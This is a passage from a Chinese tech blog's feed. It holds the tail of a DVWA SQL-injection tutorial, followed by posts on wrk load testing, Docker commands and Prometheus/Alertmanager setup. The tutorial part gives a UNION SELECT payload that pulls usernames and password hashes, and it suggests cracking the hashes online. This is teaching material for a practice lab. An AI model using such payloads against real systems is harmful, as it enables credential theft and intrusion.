<p>这么多数据，选哪个呢？？？废话，当然是user，password啦。我们再次修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select user,password from users#</div></pre></td></tr></table></figure></p>
<p>终于返回我们想看的数据了，不过貌似密码是md5加密过的，这能难倒我们么，找度娘帮忙，找一些破解md5值的网站来进行破解<br>之后返回登陆界面验证下</p>
<p>简单的SQL注入就说到这儿了，下次我们将进行DVWA里面的中级SQL注入</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。&lt;br&gt;本文所有演示
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>http压力测试工具wrk</title>
    <link href="https://t1ger.github.io/2016/11/19/http%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7wrk/"/>
    <id>https://t1ger.github.io/2016/11/19/http压力测试工具wrk/</id>
    <published>2016-11-19T08:56:36.000Z</published>
    <updated>2016-11-19T09:51:58.379Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>wrk是一款开源的压力测试工具，它没有Load Runner那么复杂，和apache的ab 一样简单上手，确比ab功能更加强大，足以应对开发过程中的性能验证了：</p>
<ul>
<li>集成了多线程设计和事件通知系统(epoll,kqueue)</li>
<li>通过lua脚本进行扩展 eg. http请求的生产、响应处理，自定义报告等</li>
</ul>
<p>下载安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># git clone https://github.com/wg/wrk.git</div><div class="line"># cd wrk/</div><div class="line"># make -j8</div><div class="line"># ./wrk  -t12 -c100 -d10s http://www.baidu.com</div></pre></td></tr></table></figure></p>
<p>要测试的网站当然是百度了，据说百度是局域网看网络通不通的首选哦，没有之一<br>我们启动 12 个线程，100 个并发，持续运行 10 秒。线程数一般设置为cpu核数的2-4倍,如果想看响应时间的分布情况可以加上–latency参数</p>
<p>[root@localhost wrk]# ./wrk  -t12 -c100 -d10s <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a><br>Running 10s test @ <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a><br>  12 threads and 100 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency   367.77ms  417.94ms   1.97s    84.84%<br>    Req/Sec     9.79      6.43    40.00     65.23%<br>  760 requests in 10.12s, 11.42MB read<br>  Socket errors: connect 0, read 0, write 0, timeout 41<br>Requests/sec:     75.13<br>Transfer/sec:      1.13MB</p>
<p>Latency: 可以理解为响应时间, 有平均值, 标准偏差, 最大值, 正负一个标准差占比<br>Requests/sec 就是最基本的指标：每秒处理的请求数(QPS)<br>Thread Stats 是线程执行情况，包括延迟、每秒处理个数，其中的 Avg 和 Max 很好理解，是平均值和最大值，Stdev 是标准差。<br>一般我们来说我们主要关注平均值和最大值. 标准差如果太大说明样本本身离散程度比较高. 有可能系统性能波动很大</p>
<p>测试场景-Post<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># cat post.lua</div><div class="line">wrk.method = &quot;POST&quot;  </div><div class="line">wrk.body   = &quot;foo=bar&amp;baz=quux&quot;  </div><div class="line">wrk.headers[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;  </div><div class="line"></div><div class="line"># ./wrk -t12 -c100 -d30s -T30s --script=post.lua --latency http://www.baidu.com</div></pre></td></tr></table></figure></p>
<p>复合场景-lua 实现访问多个 url.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">counter = 1</div><div class="line"></div><div class="line">math.randomseed(os.time())</div><div class="line">math.random(); math.random(); math.random()</div><div class="line"></div><div class="line">function file_exists(file)</div><div class="line">  local f = io.open(file, &quot;rb&quot;)</div><div class="line">  if f then f:close() end</div><div class="line">  return f ~= nil</div><div class="line">end</div><div class="line"></div><div class="line">function shuffle(paths)</div><div class="line">  local j, k</div><div class="line">  local n = #paths</div><div class="line">  for i = 1, n do</div><div class="line">    j, k = math.random(n), math.random(n)</div><div class="line">    paths[j], paths[k] = paths[k], paths[j]</div><div class="line">  end</div><div class="line">  return paths</div><div class="line">end</div><div class="line"></div><div class="line">function non_empty_lines_from(file)</div><div class="line">  if not file_exists(file) then return &#123;&#125; end</div><div class="line">  lines = &#123;&#125;</div><div class="line">  for line in io.lines(file) do</div><div class="line">    if not (line == &apos;&apos;) then</div><div class="line">      lines[#lines + 1] = line</div><div class="line">    end</div><div class="line">  end</div><div class="line">  return shuffle(lines)</div><div class="line">end</div><div class="line"></div><div class="line">paths = non_empty_lines_from(&quot;paths.txt&quot;)</div><div class="line"></div><div class="line">if #paths &lt;= 0 then</div><div class="line">  print(&quot;multiplepaths: No paths found. You have to create a file paths.txt with one path per line&quot;)</div><div class="line">  os.exit()</div><div class="line">end</div><div class="line"></div><div class="line">print(&quot;multiplepaths: Found &quot; .. #paths .. &quot; paths&quot;)</div><div class="line"></div><div class="line">request = function()</div><div class="line">    path = paths[counter]</div><div class="line">    counter = counter + 1</div><div class="line">    if counter &gt; #paths then</div><div class="line">      counter = 1</div><div class="line">    end</div><div class="line">    return wrk.format(nil, path)</div><div class="line">end</div></pre></td></tr></table></figure>
<p>场景-cookie<br>我们需要模拟一些通过 cookie 传递数据的场景. wrk 并没有特殊支持, 可以通过 wrk.headers[“Cookie”]=”xxxxx”实现. 例子是取 Response的cookie作为后续请求的cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function getCookie(cookies, name)</div><div class="line">  local start = string.find(cookies, name .. &quot;=&quot;)</div><div class="line"></div><div class="line">  if start == nil then</div><div class="line">    return nil</div><div class="line">  end</div><div class="line"></div><div class="line">  return string.sub(cookies, start + #name + 1, string.find(cookies, &quot;;&quot;, start) - 1)</div><div class="line">end</div><div class="line"></div><div class="line">response = function(status, headers, body)</div><div class="line">  local token = getCookie(headers[&quot;Set-Cookie&quot;], &quot;token&quot;)</div><div class="line">  </div><div class="line">  if token ~= nil then</div><div class="line">    wrk.headers[&quot;Cookie&quot;] = &quot;token=&quot; .. token</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure>
<p>通过源码可以看到 wrk 对象的源代码有如下属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">local wrk = &#123;</div><div class="line">   scheme  = &quot;http&quot;,</div><div class="line">   host    = &quot;localhost&quot;,</div><div class="line">   port    = nil,</div><div class="line">   method  = &quot;GET&quot;,</div><div class="line">   path    = &quot;/&quot;,</div><div class="line">   headers = &#123;&#125;,</div><div class="line">   body    = nil,</div><div class="line">   thread  = nil,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>schema, host, port, path 这些, 我们一般都是通过 wrk 命令行参数来指定,wrk 还提供了几个lua的hook函数：<br>setup //在目标 IP 地址已经解析完, 并且所有 thread 已经生成, 但是还没有开始时被调用. 每个线程执行一次这个函数.可以通过thread:get(name),  thread:set(name, value)设置线程级别的变量<br>init  //每次请求发送之前被调用<br>delay //返回一个数值, 在这次请求执行完以后延迟多长时间执行下一个请求. 可以对应 thinking time 的场景<br>request  //函数可以每次请求之前修改本次请求的属性. 返回一个字符串. 这个函数要慎用, 会影响测试端性能<br>response //每次请求返回以后被调用. 可以根据响应内容做特殊处理, 比如遇到特殊响应停止执行测试, 或输出到控制台等等<br>done   //在所有请求执行完以后调用, 一般用于自定义统计结果</p>
<p>已经迫不及待了吧，让我们看看源码给的例子吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">local counter = 1</div><div class="line">local threads = &#123;&#125;</div><div class="line"></div><div class="line">function setup(thread)</div><div class="line">   thread:set(&quot;id&quot;, counter)</div><div class="line">   table.insert(threads, thread)</div><div class="line">   counter = counter + 1</div><div class="line">end</div><div class="line"></div><div class="line">function init(args)</div><div class="line">   requests  = 0</div><div class="line">   responses = 0</div><div class="line"></div><div class="line">   local msg = &quot;thread %d created&quot;</div><div class="line">   print(msg:format(id))</div><div class="line">end</div><div class="line"></div><div class="line">function request()</div><div class="line">   requests = requests + 1</div><div class="line">   return wrk.request()</div><div class="line">end</div><div class="line"></div><div class="line">function response(status, headers, body)</div><div class="line">   responses = responses + 1</div><div class="line">end</div><div class="line"></div><div class="line">function done(summary, latency, requests)</div><div class="line">   for index, thread in ipairs(threads) do</div><div class="line">      local id        = thread:get(&quot;id&quot;)</div><div class="line">      local requests  = thread:get(&quot;requests&quot;)</div><div class="line">      local responses = thread:get(&quot;responses&quot;)</div><div class="line">      local msg = &quot;thread %d made %d requests and got %d responses&quot;</div><div class="line">      print(msg:format(id, requests, responses))</div><div class="line">   end</div><div class="line">end</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/wg/wrk" target="_blank" rel="external">wrk 官网</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;wrk是一款开源的压力测试工具，它没有Load Runner那么复杂，和apache的ab 一样简单上手，确比ab功能更加强大，足以应对开发过程中的性能验证了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成了多线程设计和事件通知系统(epoll,kqueue)&lt;/li&gt;
&lt;l
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker日常命令</title>
    <link href="https://t1ger.github.io/2016/11/19/docker%E6%97%A5%E5%B8%B8%E5%91%BD%E4%BB%A4/"/>
    <id>https://t1ger.github.io/2016/11/19/docker日常命令/</id>
    <published>2016-11-19T05:35:24.000Z</published>
    <updated>2016-11-19T05:59:18.166Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>启动容器并启动bash(交互)：<br>docker run -i -t <image_name container_id=""> /bin/bash</image_name></p>
</li>
<li><p>启动容器以后台方式运行<br>docker run -d -it <image_name container_id=""></image_name></p>
</li>
<li><p>启动容器并映射对外端口<br>docker run -p <host_ip>:<container_ip> <image> <cmd><br>docker run -d -p 80:80 -p 2003:2003 -p 8125:8125/udp -p 8126:8126 –name jlachowski-grafana-dashboard jlachowski/grafana-graphite-statsd</cmd></image></container_ip></host_ip></p>
</li>
</ul>
<ul>
<li><p>进入容器，同时运行bash<br>docker exec -t -i <id container_name=""> /bin/bash</id></p>
</li>
<li><p>查看容器日志和实时输<br>docker logs <id container_name=""><br>docker logs -f <id container_name=""></id></id></p>
</li>
<li><p>查看当前运行的container<br>docker ps<br>docker ps |less -S </p>
</li>
<li><p>显示容器的进程信息<br>docker top id/container_name</p>
</li>
<li><p>在容器中安装新程序<br>docker run image_name yum install packagename -y</p>
</li>
<li><p>从容器拷贝文件/目录到本地路径<br>docker cp <id container_name="">:/container_path to_path</id></p>
</li>
<li><p>保存对容器的修改<br>docker commit id new_image_name</p>
</li>
<li><p>删除单个或所有<br>docker rm id/container_name<br>docker rm `docker ps -a -q`</p>
</li>
<li><p>停止、启动、杀死、重启容器<br>docker <stop id="" start="" kill="" restart=""></stop>  id/container_name</p>
</li>
</ul>
<ul>
<li>操作镜像<br>docker images //列出<br>docker search images //搜索<br>docker pull image_name // 下载<br>docker rmi image_name  // 删除一个或多个<br>docker history image_name //镜像历史<br>docker push new_image_name //发布镜像</li>
</ul>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;启动容器并启动bash(交互)：&lt;br&gt;docker run -i -t &lt;image_name container_id=&quot;&quot;&gt; /bin/bash&lt;/image_name&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;启动容器以后台方式运行&lt;br&gt;docker 
    
    </summary>
    
    
      <category term="docker centos" scheme="https://t1ger.github.io/tags/docker-centos/"/>
    
  </entry>
  
  <entry>
    <title>Prometheus的信使</title>
    <link href="https://t1ger.github.io/2016/11/19/Prometheus%E7%9A%84%E4%BF%A1%E4%BD%BF/"/>
    <id>https://t1ger.github.io/2016/11/19/Prometheus的信使/</id>
    <published>2016-11-19T02:27:03.000Z</published>
    <updated>2016-11-19T02:53:06.375Z</updated>
    
    <content type="html"><![CDATA[<p>前言</p>
<p>今天介绍下Prometheus的好基友Alertmanager，让我们看下官方是怎么介绍的呢</p>
<p>The Alertmanager handles alerts sent by client applications such as the Prometheus server. It takes care of deduplicating, grouping, and routing them to the correct receiver integrations such as email, PagerDuty, or OpsGenie. It also takes care of silencing and inhibition of alerts</p>
<p>下面让我们详细解释下</p>
<p>grouping<br>分组是指当出现问题时，Alertmanager会收到一个单一的通知，比如当系统宕机时，很有可能成百上千的警报会同时生成，这种机制在某节点服务器中断中特别有用。</p>
<p>inhibition of alerts<br>抑制是指当报警发出后，停止重复发送此警报引发的其他错误的报警机制。<br>场景：<br>当网络交换机节点故障，可以配置Alertmanager忽略由该警报触发而产生的所有其他警报，这可以防止通知数百或数千与此问题不相关的其他警报。</p>
<p>silencing<br>沉默是一种简单的特定时间静音提醒的机制。一种沉默是通过匹配器来配置，就像路由树一样。传入的警报会匹配RE，如果匹配，将不会为此警报发送通知。</p>
<p>设置警报和通知的主要步骤</p>
<ul>
<li>安装配置Alertmanager</li>
<li>配置Prometheus通过 -alertmanager.url与Alertmanager通信</li>
<li>在Prometheus中创建报警规则</li>
</ul>
<p>让我们来了解下它的架构吧，如下图:<br><img src="https://raw.githubusercontent.com/prometheus/alertmanager/4e6695682acd2580773a904e4aa2e3b927ee27b7/doc/arch.jpg" alt="Alertmanager架构图"></p>
<p>这里我简单聊聊配置文件，贴出官网的一个示例，具体详细配置，请移步<a href="https://github.com/prometheus/alertmanager" target="_blank" rel="external">这里</a><br>Alertmanager通过命令行flag和一个配置文件进行配置。命令行flag配置不变的系统参数、配置文件定义的禁止规则、通知路由和通知接收器。<br>Alertmanager在运行时加载配置，如果不能很好的形成新的配置，更改将不会被应用，并记录错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line">global:</div><div class="line">  # The smarthost and SMTP sender used for mail notifications.</div><div class="line">  smtp_smarthost: &apos;localhost:25&apos;</div><div class="line">  smtp_from: &apos;alertmanager@example.org&apos;</div><div class="line"></div><div class="line"># The root route on which each incoming alert enters.</div><div class="line">route:</div><div class="line">  # The root route must not have any matchers as it is the entry point for</div><div class="line">  # all alerts. It needs to have a receiver configured so alerts that do not</div><div class="line">  # match any of the sub-routes are sent to someone.</div><div class="line">  receiver: &apos;team-X-mails&apos;</div><div class="line"></div><div class="line">  # The labels by which incoming alerts are grouped together. For example,</div><div class="line">  # multiple alerts coming in for cluster=A and alertname=LatencyHigh would</div><div class="line">  # be batched into a single group.</div><div class="line">  group_by: [&apos;alertname&apos;, &apos;cluster&apos;]</div><div class="line"></div><div class="line">  # When a new group of alerts is created by an incoming alert, wait at</div><div class="line">  # least &apos;group_wait&apos; to send the initial notification.</div><div class="line">  # This way ensures that you get multiple alerts for the same group that start</div><div class="line">  # firing shortly after another are batched together on the first</div><div class="line">  # notification.</div><div class="line">  group_wait: 30s</div><div class="line"></div><div class="line">  # When the first notification was sent, wait &apos;group_interval&apos; to send a batch</div><div class="line">  # of new alerts that started firing for that group.</div><div class="line">  group_interval: 5m</div><div class="line"></div><div class="line">  # If an alert has successfully been sent, wait &apos;repeat_interval&apos; to</div><div class="line">  # resend them.</div><div class="line">  repeat_interval: 3h</div><div class="line"></div><div class="line">  # All the above attributes are inherited by all child routes and can </div><div class="line">  # overwritten on each.</div><div class="line"></div><div class="line">  # The child route trees.</div><div class="line">  routes:</div><div class="line">  # This routes performs a regular expression match on alert labels to</div><div class="line">  # catch alerts that are related to a list of services.</div><div class="line">  - match_re:</div><div class="line">      service: ^(foo1|foo2|baz)$</div><div class="line">    receiver: team-X-mails</div><div class="line"></div><div class="line">    # The service has a sub-route for critical alerts, any alerts</div><div class="line">    # that do not match, i.e. severity != critical, fall-back to the</div><div class="line">    # parent node and are sent to &apos;team-X-mails&apos;</div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        severity: critical</div><div class="line">      receiver: team-X-pager</div><div class="line"></div><div class="line">  - match:</div><div class="line">      service: files</div><div class="line">    receiver: team-Y-mails</div><div class="line"></div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        severity: critical</div><div class="line">      receiver: team-Y-pager</div><div class="line"></div><div class="line">  # This route handles all alerts coming from a database service. If there&apos;s</div><div class="line">  # no team to handle it, it defaults to the DB team.</div><div class="line">  - match:</div><div class="line">      service: database</div><div class="line"></div><div class="line">    receiver: team-DB-pager</div><div class="line">    # Also group alerts by affected database.</div><div class="line">    group_by: [alertname, cluster, database]</div><div class="line"></div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        owner: team-X</div><div class="line">      receiver: team-X-pager</div><div class="line"></div><div class="line">    - match:</div><div class="line">        owner: team-Y</div><div class="line">      receiver: team-Y-pager</div><div class="line"></div><div class="line"></div><div class="line"># Inhibition rules allow to mute a set of alerts given that another alert is</div><div class="line"># firing.</div><div class="line"># We use this to mute any warning-level notifications if the same alert is</div><div class="line"># already critical.</div><div class="line">inhibit_rules:</div><div class="line">- source_match:</div><div class="line">    severity: &apos;critical&apos;</div><div class="line">  target_match:</div><div class="line">    severity: &apos;warning&apos;</div><div class="line">  # Apply inhibition if the alertname is the same.</div><div class="line">  equal: [&apos;alertname&apos;]</div><div class="line"></div><div class="line"></div><div class="line">receivers:</div><div class="line">- name: &apos;team-X-mails&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-X+alerts@example.org&apos;</div><div class="line"></div><div class="line">- name: &apos;team-X-pager&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-X+alerts-critical@example.org&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-X-key&gt;</div><div class="line"></div><div class="line">- name: &apos;team-Y-mails&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-Y+alerts@example.org&apos;</div><div class="line"></div><div class="line">- name: &apos;team-Y-pager&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-Y-key&gt;</div><div class="line"></div><div class="line">- name: &apos;team-DB-pager&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-DB-key&gt;</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/prometheus/alertmanager" target="_blank" rel="external">prometheus/alertmanager</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      The Alertmanager handles alerts sent by client applications such as the Prometheus server
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>监控工具之Prometheus</title>
    <link href="https://t1ger.github.io/2016/11/16/%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E4%B9%8BPrometheus/"/>
    <id>https://t1ger.github.io/2016/11/16/监控工具之Prometheus/</id>
    <published>2016-11-16T09:23:56.000Z</published>
    <updated>2016-11-16T15:44:20.262Z</updated>
    
    <content type="html"><![CDATA[<p>Prometheus是一个开源的系统监控和报警的工具包，最初由SoundCloud发布,大多数组件是用go完成的。Prometheus 监控数据通过服务或静态配置来发现<br>，通过pull方式采集时间序列，通过http协议传输，支持通过中介网关的push时间序列的方式，不依赖分布式存储，支持图表和dashboard等多种方式,适用于监控所有时间序列的项目。</p>
<p>下图是Prometheus和它的组件的整体架构：<br><img src="https://camo.githubusercontent.com/df3e3daf7d6809ba82986eb33664a4283314f7a9/68747470733a2f2f63646e2e7261776769742e636f6d2f70726f6d6574686575732f70726f6d6574686575732f653736316630642f646f63756d656e746174696f6e2f696d616765732f6172636869746563747572652e737667" alt="Prometheus架构"></p>
<p>Prometheus通过直接或者短时jobs中介网关收集监控数据，在本地存储所有收集到的数据，并且通过定义好的rules产生新的时间序列数据，或者发送警报。Promdash或者其他使用API的clients可以将采集到的数据可视化。</p>
<p>快速安装配置教程：<br>Prometheus可通过二进制安装或者docker安装，这里我们使用二进制安装<br><a href="https://prometheus.io/download" target="_blank" rel="external">下载最新版本</a> ，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar xvfz prometheus-*.tar.gz</div><div class="line">cd prometheus-*</div><div class="line">./prometheus -config.file=prometheus.yml</div></pre></td></tr></table></figure></p>
<p>在 <a href="http://localhost:9090" target="_blank" rel="external">http://localhost:9090</a> 可以看到状态页。你也可以通过 <a href="http://localhost:9090/metrics" target="_blank" rel="external">http://localhost:9090/metrics</a> 查看监控项<br>这里我们以监控mysql为例来说下部署流程<br>修改prometheus.yml，在文件最后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- job_name: &apos;mysql&apos;</div><div class="line">    # Override the global default and scrape targets from this job every 5 seconds.</div><div class="line">    scrape_interval: 5s</div><div class="line">    # metrics_path defaults to &apos;/metrics&apos;</div><div class="line">    # scheme defaults to &apos;http&apos;.</div><div class="line">    static_configs:</div><div class="line">      - targets: [&apos;localhost:9104&apos;]</div><div class="line">        labels:</div><div class="line">          instance: db1</div></pre></td></tr></table></figure>
<p>重启prometheus服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./prometheus -config.file=prometheus.yml</div></pre></td></tr></table></figure></p>
<p>再打开localhost:9090，查看Status -&gt;Targets页面下，就可以看到配置的两个target：一个是prometheus本身，State为UP，另一个是mysql，State为DOWN，因为我们还没有配置监控mysql的服务。</p>
<p>安装mysql exporter<br>这里可以直接使用docker或者下载二进制包解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull prom/mysqld-exporter</div></pre></td></tr></table></figure></p>
<p>mysql exporter 需要连接mysql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CREATE USER &apos;mysqlexporter&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;mysqlexporter&apos;;</div><div class="line">GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO &apos;mysqlexporter&apos;@&apos;localhost&apos;</div></pre></td></tr></table></figure></p>
<p>如果使用docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker run -d \          </div><div class="line">-p 9104:9104 \        </div><div class="line">-e DATA_SOURCE_NAME=&quot;mysqlexporter:mysqlexporter@(localhost:3306)/data_store&quot; prom/mysqld-exporter</div></pre></td></tr></table></figure></p>
<p>如果使用二进制包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">tar zxf mysqld_exporter-* -C /usr/local/prometheus_exporters</div><div class="line">cd /usr/local/prometheus_exporters</div><div class="line">$ cat &lt;&lt; EOF &gt; .my.cnf</div><div class="line">[client]</div><div class="line">user=mysqlexporter</div><div class="line">password=mysqlexporter</div><div class="line">EOF</div><div class="line">$ ./mysqld_exporter -config.my-cnf=&quot;.my.cnf&quot;</div></pre></td></tr></table></figure></p>
<p>我们再次回到Status-&gt;Targets页面，可以看到两个Target的状态已经变成UP了</p>
<p>ref</p>
<p><a href="https://prometheus.io/" target="_blank" rel="external">prometheus.io</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Prometheus是一个开源的系统监控和报警的工具包，最初由SoundCloud发布,大多数组件是用go完成的。Prometheus 监控数据通过服务或静态配置来发现&lt;br&gt;，通过pull方式采集时间序列，通过http协议传输，支持通过中介网关的push时间序列的方式，不
    
    </summary>
    
    
      <category term="linux" scheme="https://t1ger.github.io/tags/linux/"/>
    
      <category term="google" scheme="https://t1ger.github.io/tags/google/"/>
    
      <category term="Prometheus" scheme="https://t1ger.github.io/tags/Prometheus/"/>
    
  </entry>
  
  <entry>
